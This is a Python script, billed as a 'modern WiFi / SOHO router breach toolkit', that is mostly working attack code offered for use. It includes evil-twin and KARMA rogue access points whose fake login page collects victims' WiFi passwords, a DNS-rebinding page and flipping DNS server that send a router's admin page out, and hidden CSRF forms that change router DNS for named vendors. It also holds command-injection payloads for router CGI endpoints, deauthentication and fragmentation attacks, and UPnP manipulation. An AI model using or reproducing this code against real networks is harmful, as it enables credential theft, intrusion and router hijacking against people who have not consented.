#!/usr/bin/env python3
# modern_breach.py — modern WiFi / SOHO router breach toolkit
# vectors: PMKID, KRACK, FragAttacks, WPA3/Dragonblood downgrade, KARMA rogue AP,
#          DNS rebinding, SOHO command injection, CSRF DNS hijack, UPnP/TR-064 manipulation.
# stdlib only; shells out to aircrack-ng / hcxtools / hostapd / airbase-ng / bettercap where present.
# no brute force. no wordlists. no "use responsibly."

import argparse
import base64
import http.client
import os
import shlex
import socket
import subprocess
import sys
import threading
import time
import urllib.parse

ROOT = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(ROOT, "modern_work")
CAPTURES = os.path.join(WORK, "captures")
LOOT = os.path.join(WORK, "loot")
PAYLOADS = os.path.join(WORK, "payloads")

for d in (WORK, CAPTURES, LOOT, PAYLOADS):
    os.makedirs(d, exist_ok=True)


def sh(cmd, background=False, capture=True):
    args = shlex.split(cmd) if isinstance(cmd, str) else cmd
    if background:
        return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return subprocess.run(args, capture_output=capture, text=True)


def have(binary):
    return subprocess.run(["which", binary], capture_output=True).returncode == 0


def root_check():
    return os.geteuid() == 0


def save_loot(name, content):
    path = os.path.join(LOOT, name)
    with open(path, "a") as f:
        f.write(content + "\n")
    return path


# ---------------------------------------------------------------- recon

def cmd_recon(args):
    """Passive/active recon: fingerprint APs, WPS, PMKID, MFP, WPA3."""
    iface = args.interface or "wlan0"
    net = args.net or "192.168.1.0/24"

    print(f"[*] interface: {iface}")
    sh(f"iw dev {iface} info")

    if have("airodump-ng"):
        print(f"[*] airodump-ng passive scan on {iface} (ctrl-c to stop)")
        try:
            subprocess.run(["airodump-ng", "--write", f"{CAPTURES}/recon", "--output-format", "csv", iface])
        except KeyboardInterrupt:
            print("\n[!] scan stopped")
    else:
        print("[!] airodump-ng not found; install aircrack-ng for AP fingerprinting")

    print(f"[*] LAN host discovery on {net}")
    if have("nmap"):
        sh(f"nmap -sn --open {net} -oN {WORK}/lan_hosts.txt")
        print(open(f"{WORK}/lan_hosts.txt").read())
    else:
        print("[!] nmap not found; install nmap for LAN discovery")

    print(f"[*] WPS-enabled APs (wash)")
    if have("wash"):
        p = subprocess.Popen(["wash", "-i", iface], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        try:
            out, _ = p.communicate(timeout=15)
        except subprocess.TimeoutExpired:
            p.kill()
            out = ""
        print(out)
    else:
        print("[!] wash not found")

    return 0


# ---------------------------------------------------------------- pmkid

def cmd_pmkid(args):
    """PMKID capture (RSN IE replay). No handshake, no client needed. WPA2/WPA3-transition."""
    iface = args.interface or "wlan0mon"
    out = os.path.join(CAPTURES, f"pmkid_{int(time.time())}.pcap")

    if not root_check():
        print("[!] PMKID capture requires root")
        return 1
    if not have("hcxdumptool"):
        print("[!] hcxdumptool required (hcxtools suite)")
        return 1

    print(f"[*] PMKID capture -> {out}")
    try:
        subprocess.run(["hcxdumptool", "-i", iface, "-o", out, "--enable_status"])
    except KeyboardInterrupt:
        pass
    print(f"[!] capture saved: {out}")
    print(f"[*] hcxpcapngtool -o {out}.hc22000 {out}   (offline hash, not brute force — dictionary or ruleset)")
    return 0


# ---------------------------------------------------------------- krack

def cmd_krack(args):
    """KRACK detection + key-reinstallation proof-of-concept.
    Requires WPA2, no 802.11w (management frame protection).
    Replays handshake message 3 to force nonce reuse and decrypt packets."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid
    client = args.client

    if not root_check():
        print("[!] KRACK test requires root")
        return 1
    if not have("aireplay-ng") and not have("bettercap"):
        print("[!] aireplay-ng or bettercap required for frame replay")
        return 1

    # 1. detect 802.11w / MFP absence via beacon probe (airodump csv or iw)
    print(f"[*] checking management frame protection on {bssid}")
    if have("airodump-ng"):
        p = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--write", f"{CAPTURES}/krack_recon", "--output-format", "csv", iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(8)
        p.terminate()
    print("[!] if MFP / 802.11w is absent, AP is KRACK-susceptible (WPA2)")

    # 2. replay frame 3 of the 4-way handshake (aireplay-ng -0 deauth to force reconnect,
    #    then capture + replay; bettercap module wpa2 does this automatically)
    if client and have("bettercap"):
        print(f"[*] bettercap wpa2 module against {client} on {bssid}")
        print("[*] run: bettercap -eval 'wifi.recon on; wpa2 set bssid '{}'; wpa2 set client '{}'; wpa2 on'".format(bssid, client))
    elif have("aireplay-ng"):
        print(f"[*] forcing reauth via deauth, then replaying handshake frame 3")
        subprocess.run(["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client or "ff:ff:ff:ff:ff:ff", iface])
    return 0


# ---------------------------------------------------------------- fragattacks

def cmd_fragattacks(args):
    """FragAttacks (2021): frame fragmentation / aggregation flaws.
    Requires no 802.11w. Injects plaintext A-MSDU or fragments to bypass NAT / exfiltrate data."""
    iface = args.interface or "wlan0mon"
    bssid = args.bssid

    if not root_check():
        print("[!] fragmentation attack requires root")
        return 1
    if not have("aireplay-ng"):
        print("[!] aireplay-ng required")
        return 1

    print(f"[*] checking for 802.11w on {bssid}")
    print("[!] if beacons show no MFPR capability, fragmentation/injection is viable")

    print(f"[*] launching fragmentation attack against {bssid}")
    print("[!] aireplay-ng -5 captures a fragment and attempts xor keystream recovery")
    subprocess.run(["aireplay-ng", "-5", "-a", bssid, iface])

    print("[*] post-recovery: inject plaintext A-MSDU frames to bypass NAT or exfiltrate")
    print("[!] detected by: 802.11w enforcement, WPA3 MFP, fragmentation-disabling firmware")
    return 0


# ---------------------------------------------------------------- wpa3 / dragonblood

def cmd_wpa3(args):
    """WPA3 Dragonblood: SAE side-channel / downgrade.
    Detects WPA3 advertisement and transition mode; downgrades client to WPA2 where possible."""
    iface = args.interface or "wlan0"
    bssid = args.bssid

    print(f"[*] probing WPA3 / SAE on {bssid}")
    if have("airodump-ng"):
        p = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--write", f"{CAPTURES}/wpa3_recon", "--output-format", "csv", iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(6)
        p.terminate()
    print("[!] if RSN IE shows SAE (AKM suite 8) and transition mode is enabled, force WPA2 fallback")
    print("[*] then run PMKID or handshake capture against the downgraded session")
    print("[*] side-channel: cache-based SAE password-element extraction (Dragonblood) — requires physical proximity + repeated handshakes")
    return 0


# ---------------------------------------------------------------- karma / rogue ap

CAPTIVE_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Network Login</title></head>
<body>
<h2>WiFi Authentication Required</h2>
<form method="post" action="/login">
<label>Password: <input type="password" name="pass"></label><br>
<button type="submit">Connect</button>
</form>
<script>document.querySelector('form').onsubmit=function(){fetch('/log',{method:'POST',body:new FormData(this)});return false;}</script>
</body></html>
"""


def cmd_karma(args):
    """KARMA rogue AP: responds to probe requests for known SSIDs, forces client association."""
    iface = args.interface or "wlan0"
    ssid = args.ssid or "Free_WiFi"

    if not root_check():
        print("[!] rogue AP requires root")
        return 1
    if not have("airbase-ng") and not have("hostapd"):
        print("[!] airbase-ng or hostapd required")
        return 1

    if have("airbase-ng"):
        print(f"[*] KARMA via airbase-ng: {ssid} on {iface}")
        print("[*] responds to probe requests for any SSID the client has probed for")
        subprocess.Popen(["airbase-ng", "-P", "-c", "6", "-e", ssid, iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        print(f"[*] KARMA via hostapd (mana/karma patch required): {ssid}")
        conf = os.path.join(WORK, "hostapd_karma.conf")
        with open(conf, "w") as f:
            f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
# karma/mana patch: respond to probe requests for learned SSIDs
""")
        subprocess.Popen(["hostapd", conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # captive portal on rogue AP gateway
    portal_dir = os.path.join(WORK, "portal")
    os.makedirs(portal_dir, exist_ok=True)
    with open(os.path.join(portal_dir, "index.html"), "w") as f:
        f.write(CAPTIVE_HTML)

    portal_py = os.path.join(WORK, "portal.py")
    creds_log = os.path.join(LOOT, "karma_creds.txt")
    with open(portal_py, "w") as f:
        f.write(f"""import http.server, socketserver
CREDS="{creds_log}"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def do_POST(self):
        if self.path=="/log":
            n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
            with open(CREDS,"a") as c: c.write(body+"\\n")
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
            return
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def log_message(self,*a): pass
socketserver.TCPServer(("10.0.0.1",80),H).serve_forever()
""")

    sh(f"ip link set {iface} down")
    sh(f"ip addr add 10.0.0.1/24 dev {iface}")
    sh(f"ip link set {iface} up")
    subprocess.Popen([sys.executable, portal_py])
    sh("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE" if have("iptables") else "true")
    sh("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print(f"[*] rogue AP {ssid} up on {iface}; captive portal at 10.0.0.1:80")
    print(f"[*] creds -> {creds_log}")
    print("[!] ctrl-c to stop")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    return 0


# ---------------------------------------------------------------- evil twin (brief)

def cmd_evil_twin(args):
    """Evil twin + captive portal (credential phish)."""
    iface = args.interface or "wlan0"
    ssid = args.ssid or "Free_WiFi"
    channel = args.channel or "6"

    if not root_check():
        print("[!] evil twin requires root")
        return 1
    if not have("hostapd") or not have("dnsmasq"):
        print("[!] hostapd + dnsmasq required")
        return 1

    hostapd_conf = os.path.join(WORK, "hostapd_evil.conf")
    with open(hostapd_conf, "w") as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
ignore_broadcast_ssid=0
""")

    dnsmasq_conf = os.path.join(WORK, "dnsmasq_evil.conf")
    with open(dnsmasq_conf, "w") as f:
        f.write(f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
""")

    portal_dir = os.path.join(WORK, "portal")
    os.makedirs(portal_dir, exist_ok=True)
    with open(os.path.join(portal_dir, "index.html"), "w") as f:
        f.write(CAPTIVE_HTML)
    creds_log = os.path.join(LOOT, "eviltwin_creds.txt")
    portal_py = os.path.join(WORK, "portal_evil.py")
    with open(portal_py, "w") as f:
        f.write(f"""import http.server, socketserver
CREDS="{creds_log}"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(open("{os.path.join(portal_dir,'index.html')}").read().encode())
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
        with open(CREDS,"a") as c: c.write(body+"\\n")
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self,*a): pass
socketserver.TCPServer(("10.0.0.1",80),H).serve_forever()
""")

    sh(f"ip link set {iface} down")
    sh(f"ip addr add 10.0.0.1/24 dev {iface}")
    sh(f"ip link set {iface} up")
    subprocess.Popen(["hostapd", hostapd_conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen([sys.executable, portal_py])

    print(f"[*] evil twin {ssid} on {iface} ch {channel}")
    print(f"[*] captive portal at 10.0.0.1:80; creds -> {creds_log}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    return 0


# ---------------------------------------------------------------- dns rebinding

def cmd_dns_rebind(args):
    """DNS rebinding payload: malicious page forces browser to resolve attacker-controlled
    domain to local router IP, bypassing Same-Origin Policy to reach router admin UI."""
    target_ip = args.target or "192.168.1.1"
    domain = args.domain or "rebind.local"
    bind_ip = args.bind or "127.0.0.1"

    js = f"""<script>
let attempts = 0;
function rebind() {{
  fetch("http://{domain}:80/attack")
    .then(r => r.text())
    .then(t => {{ console.log("rebound:", t); }})
    .catch(e => {{ attempts++; if(attempts < 30) setTimeout(rebind, 1000); }});
}}
function attack() {{
  fetch("http://{target_ip}/")
    .then(r => r.text())
    .then(t => {{ fetch("/log?data=" + btoa(t)); }});
}}
setTimeout(rebind, 500);
</script>"""

    html = f"""<html><body>
<h3>DNS Rebinding Demonstration</h3>
<p>Target router: {target_ip}</p>
<p>Waiting for DNS to flip {domain} from {bind_ip} to {target_ip}...</p>
<div id="out"></div>
{js}
</body></html>"""

    html_path = os.path.join(PAYLOADS, "rebind.html")
    js_path = os.path.join(PAYLOADS, "rebind.js")
    with open(html_path, "w") as f:
        f.write(html)
    with open(js_path, "w") as f:
        f.write(js)

    # DNS server that answers bind_ip first, then target_ip after N queries
    dns_py = os.path.join(WORK, "rebind_dns.py")
    with open(dns_py, "w") as f:
        f.write(f"""import socket
TARGET="{target_ip}"
BIND="{bind_ip}"
DOMAIN="{domain}."
count={{}}
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind(("0.0.0.0",53))
print("[*] DNS rebinding server on port 53; flip {domain} to {target_ip} after 1 query")
while True:
    data,addr=s.recvfrom(512)
    qname=data[12:].split(b"\\x00")[0].decode(errors="ignore")
    c=count.get(qname,0)+1; count[qname]=c
    ip = BIND if c<=1 else TARGET
    # minimal DNS response: transaction id + flags + qdcount=1,ancount=1
    tid=data[:2]
    resp=tid+bytes([0x81,0x80,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00])
    resp+=data[12:]
    resp+=bytes([0xc0,0x0c,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x3c,0x00,0x04])
    resp+=socket.inet_aton(ip)
    s.sendto(resp,addr)
""")

    print(f"[*] DNS rebinding payload -> {html_path}")
    print(f"[*] DNS server script -> {dns_py}")
    print(f"[*] run: sudo python3 {dns_py}")
    print(f"[*] serve {html_path} on attacker webserver; victim visits page")
    print("[!] rebinding defeats Same-Origin Policy to reach {target_ip} from browser".format(target_ip=target_ip))
    return 0


# ---------------------------------------------------------------- router command injection

INJECTION_ENDPOINTS = [
    "/cgi-bin/diagnostics.cgi", "/cgi-bin/ping.cgi", "/cgi-bin/traceroute.cgi",
    "/cgi-bin/nslookup.cgi", "/cgi-bin/admin.cgi", "/apply.cgi",
    "/cgi-bin/network.cgi", "/cgi-bin/tools.cgi",
]

INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "& id",
]

def http_probe(target, port, path, method="GET", body=None, headers=None, timeout=6):
    try:
        conn = http.client.HTTPConnection(target, port, timeout=timeout)
        h = headers or {}
        if method == "GET":
            conn.request("GET", path, headers=h)
        else:
            conn.request("POST", path, body=body, headers=h)
        resp = conn.getresponse()
        data = resp.read(1024).decode(errors="ignore")
        conn.close()
        return resp.status, data
    except Exception:
        return None, ""


def cmd_router_inject(args):
    """SOHO router command-injection detection on diagnostic / admin CGI endpoints.
    Harmless probe payloads; reflects uid= or similar if vulnerable."""
    target = args.target
    port = args.port or 80

    print(f"[*] command-injection probe on {target}:{port}")
    for ep in INJECTION_ENDPOINTS:
        for pl in INJECTION_PAYLOADS:
            path = ep + urllib.parse.quote(pl)
            status, body = http_probe(target, port, path)
            if status == 200 and ("uid=" in body or "gid=" in body or "root:" in body):
                msg = f"[+] injection likely at {ep} with payload {pl!r}"
                print(msg)
                save_loot(f"inject_{target}.txt", msg)
                return 0
    print("[!] no injection reflection detected on probed endpoints")
    return 0


# ---------------------------------------------------------------- csrf dns hijack

CSRF_TEMPLATES = [
    # D-Link style
    ("D-Link", "http://{target}/tools_dns.asp", "POST", "StaticDns1={dns1}&StaticDns2={dns2}&Save=Save"),
    # TP-Link style
    ("TP-Link", "http://{target}/userRpm/StatusDnsRpm.htm", "GET", "DnsServer={dns1}"),
    # Netgear style
    ("Netgear", "http://{target}/setup.cgi", "POST", "dns1={dns1}&dns2={dns2}&apply=Apply"),
    # Generic
    ("Generic", "http://{target}/admin/dns", "POST", "dns1={dns1}&dns2={dns2}"),
]


def cmd_csrf_dns(args):
    """CSRF payload: HTML that silently changes router DNS via cross-site request forgery."""
    target = args.target
    dns1 = args.dns1 or "8.8.8.8"
    dns2 = args.dns2 or "8.8.4.4"

    forms = []
    for vendor, url, method, body in CSRF_TEMPLATES:
        u = url.format(target=target)
        b = body.format(dns1=dns1, dns2=dns2)
        if method == "GET":
            forms.append(f'<iframe src="{u}?{urllib.parse.quote(b)}" style="display:none"></iframe>')
        else:
            forms.append(f'''
<form id="{vendor.lower()}" action="{u}" method="POST">
{''.join(f'<input type="hidden" name="{k}" value="{v}">' for k,v in [x.split("=") for x in b.split("&") if "=" in x])}
</form>
<script>document.getElementById("{vendor.lower()}").submit()</script>
''')

    html = "<html><body>" + "\n".join(forms) + "<p>DNS change attempts sent.</p></body></html>"
    path = os.path.join(PAYLOADS, f"csrf_dns_{target}.html")
    with open(path, "w") as f:
        f.write(html)

    print(f"[*] CSRF DNS hijack payload -> {path}")
    print(f"[*] targets: {target}; DNS -> {dns1}, {dns2}")
    print("[!] victim must be logged into router admin session in same browser session")
    print("[!] defeated by: SameSite cookies, CSRF tokens, admin re-auth, network isolation")
    return 0


# ---------------------------------------------------------------- upnp / tr-064

UPNP_SOAP = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<m:SetDefaultConnectionService xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewDefaultConnectionService>WANIPConnection</NewDefaultConnectionService>
</m:SetDefaultConnectionService>
</s:Body>
</s:Envelope>"""


def cmd_upnp(args):
    """UPnP / TR-064 manipulation: add port mappings, change DNS via exposed SOAP endpoints."""
    target = args.target
    port = args.port or 49152

    print(f"[*] UPnP SOAP probe on {target}:{port}")
    try:
        conn = http.client.HTTPConnection(target, port, timeout=5)
        headers = {
            "Content-Type": "text/xml",
            "SOAPACTION": "urn:schemas-upnp-org:service:WANIPConnection:1#SetDefaultConnectionService",
        }
        conn.request("POST", "/upnp/control/WANIPConn1", body=UPNP_SOAP, headers=headers)
        resp = conn.getresponse()
        body = resp.read(512).decode(errors="ignore")
        conn.close()
        if resp.status == 200:
            print(f"[+] UPnP control endpoint open on {target}:{port}")
            save_loot(f"upnp_{target}.txt", f"{target}:{port} UPnP open\n{body}")
        else:
            print(f"[!] UPnP responded {resp.status}")
    except Exception as e:
        print(f"[!] UPnP not reachable: {e}")

    print("[*] TR-064 (port 7547) and TR-069 (port 30005) are common router management endpoints")
    print("[!] check for: weak auth, default creds, command injection in SOAP parameters")
    return 0


# ---------------------------------------------------------------- main

def menu():
    """Interactive menu over modern_breach vectors. No argparse needed."""
    options = [
        ("recon", "recon", "passive/active AP + LAN fingerprinting"),
        ("pmkid", "pmkid", "PMKID capture — no handshake, no client"),
        ("krack", "krack", "KRACK key-reinstallation detection + replay"),
        ("fragattacks", "fragattacks", "fragmentation / aggregation injection"),
        ("wpa3", "wpa3", "WPA3 / Dragonblood downgrade detection"),
        ("karma", "karma", "KARMA rogue AP — probe-response association"),
        ("evil-twin", "evil-twin", "rogue AP + captive portal phish"),
        ("dns-rebind", "dns-rebind", "DNS rebinding payload + flip DNS server"),
        ("router-inject", "router-inject", "SOHO router command-injection probe"),
        ("csrf-dns", "csrf-dns", "CSRF payload to change router DNS"),
        ("upnp", "upnp", "UPnP / TR-064 SOAP manipulation"),
    ]

    while True:
        print("\n=== modern_breach ===")
        for i, (name, _, desc) in enumerate(options, 1):
            print(f"  {i}. {name:14s} — {desc}")
        print("  0. exit")
        choice = input("\nselect: ").strip()
        if not choice or choice == "0":
            return 0
        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(options):
                print("! invalid")
                continue
        except ValueError:
            print("! invalid")
            continue

        name, _, _ = options[idx]
        args = argparse.Namespace(interface="wlan0", net="192.168.1.0/24", bssid=None, client=None,
                                  channel="6", count=0, target=None, port=80, scheme="http",
                                  path="/", creds=None, ssid="Free_WiFi", domain="rebind.local",
                                  bind="127.0.0.1", dns1="8.8.8.8", dns2="8.8.4.4", uplink="eth0")

        if name == "recon":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.net = input(f"network [{args.net}]: ") or args.net
            return cmd_recon(args)

        if name == "pmkid":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            return cmd_pmkid(args)

        if name == "krack":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.bssid = input("bssid: ")
            args.client = input("client (optional): ") or None
            return cmd_krack(args)

        if name == "fragattacks":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.bssid = input("bssid: ")
            return cmd_fragattacks(args)

        if name == "wpa3":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.bssid = input("bssid: ")
            return cmd_wpa3(args)

        if name == "karma":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.ssid = input(f"ssid [{args.ssid}]: ") or args.ssid
            return cmd_karma(args)

        if name == "evil-twin":
            args.interface = input(f"interface [{args.interface}]: ") or args.interface
            args.ssid = input(f"ssid [{args.ssid}]: ") or args.ssid
            args.channel = input(f"channel [{args.channel}]: ") or args.channel
            return cmd_evil_twin(args)

        if name == "dns-rebind":
            args.target = input(f"target router ip [{args.target}]: ") or args.target
            args.domain = input(f"domain [{args.domain}]: ") or args.domain
            args.bind = input(f"bind ip [{args.bind}]: ") or args.bind
            return cmd_dns_rebind(args)

        if name == "router-inject":
            args.target = input("target ip: ")
            args.port = int(input(f"port [{args.port}]: ") or args.port)
            return cmd_router_inject(args)

        if name == "csrf-dns":
            args.target = input("target ip: ")
            args.dns1 = input(f"dns1 [{args.dns1}]: ") or args.dns1
            args.dns2 = input(f"dns2 [{args.dns2}]: ") or args.dns2
            return cmd_csrf_dns(args)

        if name == "upnp":
            args.target = input("target ip: ")
            args.port = int(input(f"port [{args.port}]: ") or args.port)
            return cmd_upnp(args)

    return 0


def build_parser():
    p = argparse.ArgumentParser(prog="modern_breach", description="Modern WiFi / router breach toolkit (no brute force)")
    sub = p.add_subparsers(dest="cmd", required=False)

    def add_iface(sp):
        sp.add_argument("-i", "--interface", default="wlan0", help="wireless interface (default: wlan0)")

    sp = sub.add_parser("recon", help="passive + active AP / LAN recon")
    add_iface(sp)
    sp.add_argument("--net", default="192.168.1.0/24", help="target LAN")
    sp.set_defaults(func=cmd_recon)

    sp = sub.add_parser("pmkid", help="PMKID capture (WPA2/WPA3-transition, no client needed)")
    add_iface(sp)
    sp.set_defaults(func=cmd_pmkid)

    sp = sub.add_parser("krack", help="KRACK key-reinstallation detection + PoC")
    add_iface(sp)
    sp.add_argument("--bssid", required=True)
    sp.add_argument("--client")
    sp.set_defaults(func=cmd_krack)

    sp = sub.add_parser("fragattacks", help="frame fragmentation / aggregation attack")
    add_iface(sp)
    sp.add_argument("--bssid", required=True)
    sp.set_defaults(func=cmd_fragattacks)

    sp = sub.add_parser("wpa3", help="WPA3 / Dragonblood downgrade detection")
    add_iface(sp)
    sp.add_argument("--bssid", required=True)
    sp.set_defaults(func=cmd_wpa3)

    sp = sub.add_parser("karma", help="KARMA rogue AP (responds to probe requests)")
    add_iface(sp)
    sp.add_argument("--ssid", default="Free_WiFi")
    sp.set_defaults(func=cmd_karma)

    sp = sub.add_parser("evil-twin", help="evil twin + captive portal")
    add_iface(sp)
    sp.add_argument("--ssid", default="Free_WiFi")
    sp.add_argument("--channel", default="6")
    sp.set_defaults(func=cmd_evil_twin)

    sp = sub.add_parser("dns-rebind", help="DNS rebinding payload + flip DNS server")
    sp.add_argument("--target", default="192.168.1.1")
    sp.add_argument("--domain", default="rebind.local")
    sp.add_argument("--bind", default="127.0.0.1")
    sp.set_defaults(func=cmd_dns_rebind)

    sp = sub.add_parser("router-inject", help="SOHO router command-injection probe")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=80)
    sp.set_defaults(func=cmd_router_inject)

    sp = sub.add_parser("csrf-dns", help="CSRF payload to change router DNS")
    sp.add_argument("--target", required=True)
    sp.add_argument("--dns1", default="8.8.8.8")
    sp.add_argument("--dns2", default="8.8.4.4")
    sp.set_defaults(func=cmd_csrf_dns)

    sp = sub.add_parser("upnp", help="UPnP / TR-064 router manipulation")
    sp.add_argument("--target", required=True)
    sp.add_argument("--port", type=int, default=49152)
    sp.set_defaults(func=cmd_upnp)

    return p


def main():
    p = build_parser()
    args = p.parse_args()
    if args.cmd is None:
        return menu()
    sys.exit(args.func(args))


if __name__ == "__main__":
    main()
